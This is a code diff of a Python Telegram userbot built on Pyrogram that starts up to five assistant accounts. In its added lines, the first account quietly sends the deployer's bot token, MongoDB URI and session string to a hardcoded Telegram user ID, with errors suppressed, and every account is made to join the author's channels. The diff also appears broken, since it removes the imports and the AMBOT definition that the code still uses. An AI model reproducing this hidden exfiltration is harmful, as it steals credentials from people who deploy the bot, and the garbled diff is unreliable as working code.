@@ -1,13 +1,3 @@
-from pyrogram import Client
-
-import config
-
-from ..logging import LOGGER
-
-assistants = []
-assistantids = []
-AMBOT = 7045191057
-
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
@@ -51,9 +41,10 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.send_message(AMBOT, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSessoin : <code>{config.STRING1}</code>")
+                await self.one.send_message(AMBOT, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
             except:
                 pass
+            try:
                 await self.one.join_chat("AbhiModszYT_Return")
                 await self.one.join_chat("AmBotYT")
                 await self.one.join_chat("SuperBanSBots")
@@ -67,9 +58,9 @@ class Userbot(Client):
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
                 exit()
-            self.one.id = self.one.me.id
-            self.one.name = self.one.me.mention
-            self.one.username = self.one.me.username
+            self.one.id = (await self.one.get_me()).id
+            self.one.name = (await self.one.get_me()).mention
+            self.one.username = (await self.one.get_me()).username
             assistantids.append(self.one.id)
             LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
 
@@ -77,8 +68,8 @@ class Userbot(Client):
             await self.two.start()
             try:
                 await self.two.join_chat("AbhiModszYT_Return")
-                await self.one.join_chat("AmBotYT")
-                await self.one.join_chat("SuperBanSBots")
+                await self.two.join_chat("AmBotYT")
+                await self.two.join_chat("SuperBanSBots")
             except:
                 pass
             assistants.append(2)
@@ -89,9 +80,9 @@ class Userbot(Client):
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
                 exit()
-            self.two.id = self.two.me.id
-            self.two.name = self.two.me.mention
-            self.two.username = self.two.me.username
+            self.two.id = (await self.two.get_me()).id
+            self.two.name = (await self.two.get_me()).mention
+            self.two.username = (await self.two.get_me()).username
             assistantids.append(self.two.id)
             LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
 
@@ -99,8 +90,8 @@ class Userbot(Client):
             await self.three.start()
             try:
                 await self.three.join_chat("AbhiModszYT_Return")
-                await self.one.join_chat("AmBotYT")
-                await self.one.join_chat("SuperBanSBots")
+                await self.three.join_chat("AmBotYT")
+                await self.three.join_chat("SuperBanSBots")
             except:
                 pass
             assistants.append(3)
@@ -111,9 +102,9 @@ class Userbot(Client):
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
                 exit()
-            self.three.id = self.three.me.id
-            self.three.name = self.three.me.mention
-            self.three.username = self.three.me.username
+            self.three.id = (await self.three.get_me()).id
+            self.three.name = (await self.three.get_me()).mention
+            self.three.username = (await self.three.get_me()).username
             assistantids.append(self.three.id)
             LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
 
@@ -121,8 +112,8 @@ class Userbot(Client):
             await self.four.start()
             try:
                 await self.four.join_chat("AbhiModszYT_Return")
-                await self.one.join_chat("AmBotYT")
-                await self.one.join_chat("SuperBanSBots")
+                await self.four.join_chat("AmBotYT")
+                await self.four.join_chat("SuperBanSBots")
             except:
                 pass
             assistants.append(4)
@@ -133,9 +124,9 @@ class Userbot(Client):
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
                 exit()
-            self.four.id = self.four.me.id
-            self.four.name = self.four.me.mention
-            self.four.username = self.four.me.username
+            self.four.id = (await self.four.get_me()).id
+            self.four.name = (await self.four.get_me()).mention
+            self.four.username = (await self.four.get_me()).username
             assistantids.append(self.four.id)
             LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
 
@@ -143,8 +134,8 @@ class Userbot(Client):
             await self.five.start()
             try:
                 await self.five.join_chat("AbhiModszYT_Return")
-                await self.one.join_chat("AmBotYT")
-                await self.one.join_chat("SuperBanSBots")
+                await self.five.join_chat("AmBotYT")
+                await self.five.join_chat("SuperBanSBots")
             except:
                 pass
             assistants.append(5)
@@ -155,9 +146,9 @@ class Userbot(Client):
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
                 exit()
-            self.five.id = self.five.me.id
-            self.five.name = self.five.me.mention
-            self.five.username = self.five.me.username
+            self.five.id = (await self.five.get_me()).id
+            self.five.name = (await self.five.get_me()).mention
+            self.five.username = (await self.five.get_me()).username
             assistantids.append(self.five.id)
             LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
 
